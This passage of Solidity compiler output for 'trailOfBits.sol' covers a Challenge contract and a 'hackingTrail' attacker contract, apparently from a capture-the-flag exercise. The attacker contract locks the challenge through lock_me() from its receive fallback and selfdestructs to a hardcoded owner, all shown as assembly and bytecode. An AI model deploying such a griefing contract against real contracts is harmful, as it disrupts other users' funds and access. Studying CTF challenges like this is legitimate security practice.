										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1433,
											"end": 1438,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1471,
											"end": 1477,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1458,
											"end": 1478,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 1449,
											"end": 1478,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1449,
											"end": 1478,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1514,
											"end": 1519,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "tag",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 1487,
											"end": 1520,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1387,
											"end": 1526,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1591,
											"end": 1597,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1640,
											"end": 1642,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1628,
											"end": 1637,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1619,
											"end": 1626,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1615,
											"end": 1638,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1611,
											"end": 1643,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "tag",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 1646,
											"end": 1725,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 1608,
											"end": 1727,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1766,
											"end": 1767,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1836,
											"end": 1843,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1827,
											"end": 1833,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1816,
											"end": 1825,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1812,
											"end": 1834,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 1791,
											"end": 1844,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1781,
											"end": 1844,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1781,
											"end": 1844,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1737,
											"end": 1854,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1532,
											"end": 1861,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 1972,
											"end": 1977,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "tag",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 1954,
											"end": 1978,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1949,
											"end": 1952,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1942,
											"end": 1979,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1985,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2084,
											"end": 2088,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2122,
											"end": 2124,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2111,
											"end": 2120,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2107,
											"end": 2125,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2099,
											"end": 2125,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2099,
											"end": 2125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 2203,
											"end": 2204,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2192,
											"end": 2201,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2188,
											"end": 2205,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2179,
											"end": 2185,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "tag",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 2135,
											"end": 2206,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1991,
											"end": 2213,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "tag",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2320,
											"end": 2331,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2357,
											"end": 2360,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2360,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2342,
											"end": 2360,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2219,
											"end": 2366,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2372,
											"end": 2486,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2651,
											"end": 2654,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2753,
											"end": 2754,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2748,
											"end": 2751,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "tag",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2672,
											"end": 2755,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2665,
											"end": 2755,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2665,
											"end": 2755,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "77"
										},
										{
											"begin": 2853,
											"end": 2856,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "tag",
											"source": 1,
											"value": "77"
										},
										{
											"begin": 2764,
											"end": 2857,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2882,
											"end": 2883,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2877,
											"end": 2880,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2873,
											"end": 2884,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2866,
											"end": 2884,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2866,
											"end": 2884,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2492,
											"end": 2890,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3080,
											"end": 3083,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "79"
										},
										{
											"begin": 3245,
											"end": 3248,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "tag",
											"source": 1,
											"value": "79"
										},
										{
											"begin": 3102,
											"end": 3249,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3095,
											"end": 3249,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3095,
											"end": 3249,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3266,
											"end": 3269,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3259,
											"end": 3269,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3259,
											"end": 3269,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2896,
											"end": 3275,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"exploit_me(address)": "548853a0",
							"lock_me()": "4c228cc7",
							"winners(uint256)": "a2fb1175"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"winner\",\"type\":\"address\"}],\"name\":\"exploit_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lock_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"winners\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"trailOfBits.sol\":\"Challenge\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"trailOfBits.sol\":{\"keccak256\":\"0x36d0c4bd3bfe96d3bdcbe157641aada3bc3761e847ad5d3400c4de136ed002ed\",\"urls\":[\"bzz-raw://f3673e42d528ae77cf6c128eaaeeb2f64ac482d56c3b182a91e320ac972722e6\",\"dweb:/ipfs/QmdxgjzgCk8kNdMxxgghwEBLNt3mQnVgAHBcFym7DDPExC\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 13,
								"contract": "trailOfBits.sol:Challenge",
								"label": "winners",
								"offset": 0,
								"slot": "0",
								"type": "t_array(t_address)dyn_storage"
							},
							{
								"astId": 15,
								"contract": "trailOfBits.sol:Challenge",
								"label": "lock",
								"offset": 0,
								"slot": "1",
								"type": "t_bool"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_array(t_address)dyn_storage": {
								"base": "t_address",
								"encoding": "dynamic_array",
								"label": "address[]",
								"numberOfBytes": "32"
							},
							"t_bool": {
								"encoding": "inplace",
								"label": "bool",
								"numberOfBytes": "1"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"IChallenge": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "winner",
									"type": "address"
								}
							],
							"name": "exploit_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "lock_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"exploit_me(address)": "548853a0",
							"lock_me()": "4c228cc7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"winner\",\"type\":\"address\"}],\"name\":\"exploit_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lock_me\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"trailOfBits.sol\":\"IChallenge\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"trailOfBits.sol\":{\"keccak256\":\"0x36d0c4bd3bfe96d3bdcbe157641aada3bc3761e847ad5d3400c4de136ed002ed\",\"urls\":[\"bzz-raw://f3673e42d528ae77cf6c128eaaeeb2f64ac482d56c3b182a91e320ac972722e6\",\"dweb:/ipfs/QmdxgjzgCk8kNdMxxgghwEBLNt3mQnVgAHBcFym7DDPExC\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"hackingTrail": {
					"abi": [
						{
							"inputs": [],
							"name": "hackTrail",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"trailOfBits.sol\":559:1325  contract hackingTrail {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"trailOfBits.sol\":559:1325  contract hackingTrail {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x157bca60\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"trailOfBits.sol\":1140:1150  0x4c228cc7 */\n      0x4c228cc7\n        /* \"trailOfBits.sol\":1137:1138  0 */\n      0x00\n        /* \"trailOfBits.sol\":1130:1151  mstore(0, 0x4c228cc7) */\n      mstore\n        /* \"trailOfBits.sol\":1211:1212  0 */\n      0x00\n        /* \"trailOfBits.sol\":1209:1210  0 */\n      dup1\n        /* \"trailOfBits.sol\":1207:1208  4 */\n      0x04\n        /* \"trailOfBits.sol\":1205:1206  0 */\n      0x00\n        /* \"trailOfBits.sol\":1203:1204  0 */\n      dup1\n        /* \"trailOfBits.sol\":1189:1202  challengeAddr */\n      0xcd7ab80da7c893f86fa8deddf862b74d94f4478e\n        /* \"trailOfBits.sol\":1183:1188  gas() */\n      gas\n        /* \"trailOfBits.sol\":1178:1213  call(gas(),challengeAddr,0,0,4,0,0) */\n      call\n        /* \"trailOfBits.sol\":1240:1241  0 */\n      0x00\n        /* \"trailOfBits.sol\":1233:1238  check */\n      dup2\n        /* \"trailOfBits.sol\":1230:1242  eq(check, 0) */\n      eq\n        /* \"trailOfBits.sol\":1227:1304  if eq(check, 0) {... */\n      iszero\n      tag_6\n      jumpi\n        /* \"trailOfBits.sol\":1272:1288  returndatasize() */\n      returndatasize\n        /* \"trailOfBits.sol\":1269:1270  0 */\n      0x00\n        /* \"trailOfBits.sol\":1262:1289  revert(0, returndatasize()) */\n      revert\n        /* \"trailOfBits.sol\":1227:1304  if eq(check, 0) {... */\n    tag_6:\n        /* \"trailOfBits.sol\":1115:1315  {... */\n      pop\n        /* \"trailOfBits.sol\":559:1325  contract hackingTrail {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"trailOfBits.sol\":848:1060  function hackTrail() external onlyRoki {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_7:\n      pop\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n    tag_9:\n        /* \"trailOfBits.sol\":741:783  0x798349E06c67272465123B91bd88C5d19b8c7878 */\n      0x798349e06c67272465123b91bd88c5d19b8c7878\n        /* \"trailOfBits.sol\":719:784  msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trailOfBits.sol\":719:729  msg.sender */\n      caller\n        /* \"trailOfBits.sol\":719:784  msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"trailOfBits.sol\":711:820  require(msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878), \"lol how did you even find this?\") */\n      tag_11\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_11:\n        /* \"trailOfBits.sol\":898:918  IChallenge challenge */\n      0x00\n        /* \"trailOfBits.sol\":631:673  0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E */\n      0xcd7ab80da7c893f86fa8deddf862b74d94f4478e\n        /* \"trailOfBits.sol\":898:946  IChallenge challenge = IChallenge(challengeAddr) */\n      swap1\n      pop\n        /* \"trailOfBits.sol\":957:966  challenge */\n      dup1\n        /* \"trailOfBits.sol\":957:974  challenge.lock_me */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x4c228cc7\n        /* \"trailOfBits.sol\":957:976  challenge.lock_me() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n      pop\n      pop\n      pop\n        /* \"trailOfBits.sol\":1008:1050  0x798349E06c67272465123B91bd88C5d19b8c7878 */\n      0x798349e06c67272465123b91bd88c5d19b8c7878\n        /* \"trailOfBits.sol\":987:1052  selfdestruct(payable(0x798349E06c67272465123B91bd88C5d19b8c7878)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n        /* \"#utility.yul\":7:176   */\n    tag_18:\n        /* \"#utility.yul\":91:102   */\n      0x00\n        /* \"#utility.yul\":125:131   */\n      dup3\n        /* \"#utility.yul\":120:123   */\n      dup3\n        /* \"#utility.yul\":113:132   */\n      mstore\n        /* \"#utility.yul\":165:169   */\n      0x20\n        /* \"#utility.yul\":160:163   */\n      dup3\n        /* \"#utility.yul\":156:170   */\n      add\n        /* \"#utility.yul\":141:170   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:176   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":182:363   */\n    tag_19:\n        /* \"#utility.yul\":322:355   */\n      0x6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f00\n        /* \"#utility.yul\":318:319   */\n      0x00\n        /* \"#utility.yul\":310:316   */\n      dup3\n        /* \"#utility.yul\":306:320   */\n      add\n        /* \"#utility.yul\":299:356   */\n      mstore\n        /* \"#utility.yul\":182:363   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":369:735   */\n    tag_20:\n        /* \"#utility.yul\":511:514   */\n      0x00\n        /* \"#utility.yul\":532:599   */\n      tag_25\n        /* \"#utility.yul\":596:598   */\n      0x1f\n        /* \"#utility.yul\":591:594   */\n      dup4\n        /* \"#utility.yul\":532:599   */\n      tag_18\n      jump\t// in\n    tag_25:\n        /* \"#utility.yul\":525:599   */\n      swap2\n      pop\n        /* \"#utility.yul\":608:701   */\n      tag_26\n        /* \"#utility.yul\":697:700   */\n      dup3\n        /* \"#utility.yul\":608:701   */\n      tag_19\n      jump\t// in\n    tag_26:\n        /* \"#utility.yul\":726:728   */\n      0x20\n        /* \"#utility.yul\":721:724   */\n      dup3\n        /* \"#utility.yul\":717:729   */\n      add\n        /* \"#utility.yul\":710:729   */\n      swap1\n      pop\n        /* \"#utility.yul\":369:735   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":741:1160   */\n    tag_13:\n        /* \"#utility.yul\":907:911   */\n      0x00\n        /* \"#utility.yul\":945:947   */\n      0x20\n        /* \"#utility.yul\":934:943   */\n      dup3\n        /* \"#utility.yul\":930:948   */\n      add\n        /* \"#utility.yul\":922:948   */\n      swap1\n      pop\n        /* \"#utility.yul\":994:1003   */\n      dup2\n        /* \"#utility.yul\":988:992   */\n      dup2\n        /* \"#utility.yul\":984:1004   */\n      sub\n        /* \"#utility.yul\":980:981   */\n      0x00\n        /* \"#utility.yul\":969:978   */\n      dup4\n        /* \"#utility.yul\":965:982   */\n      add\n        /* \"#utility.yul\":958:1005   */\n      mstore\n        /* \"#utility.yul\":1022:1153   */\n      tag_28\n        /* \"#utility.yul\":1148:1152   */\n      dup2\n        /* \"#utility.yul\":1022:1153   */\n      tag_20\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":1014:1153   */\n      swap1\n      pop\n        /* \"#utility.yul\":741:1160   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f377d757080e0787354b419f21c5e389e3df5afbeb1fb0d920a989d2d3c60abd64736f6c634300080a0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610256806100206000396000f3fe6080604052600436106100225760003560e01c8063157bca60146100645761005f565b3661005f57634c228cc7600052600080600460008073cd7ab80da7c893f86fa8deddf862b74d94f4478e5af1600081141561005c573d6000fd5b50005b600080fd5b34801561007057600080fd5b5061007961007b565b005b73798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100fd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100f490610200565b60405180910390fd5b600073cd7ab80da7c893f86fa8deddf862b74d94f4478e90508073ffffffffffffffffffffffffffffffffffffffff16634c228cc76040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561015e57600080fd5b505af1158015610172573d6000803e3d6000fd5b5050505073798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff16ff5b600082825260208201905092915050565b7f6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f00600082015250565b60006101ea601f836101a3565b91506101f5826101b4565b602082019050919050565b60006020820190508181036000830152610219816101dd565b905091905056fea2646970667358221220f377d757080e0787354b419f21c5e389e3df5afbeb1fb0d920a989d2d3c60abd64736f6c634300080a0033",
